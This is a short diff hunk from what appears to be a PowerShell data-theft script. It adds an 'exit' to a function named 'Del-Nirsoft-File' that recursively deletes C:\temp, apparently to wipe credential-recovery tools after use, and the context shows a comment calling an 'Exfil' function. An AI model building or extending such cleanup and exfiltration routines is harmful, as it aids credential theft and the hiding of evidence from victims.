@@ -124,6 +124,7 @@ function SysInfo {
 function Del-Nirsoft-File {
   cd C:\
   rmdir -R \temp
+  exit
 }
 
 # Call the Exfil function
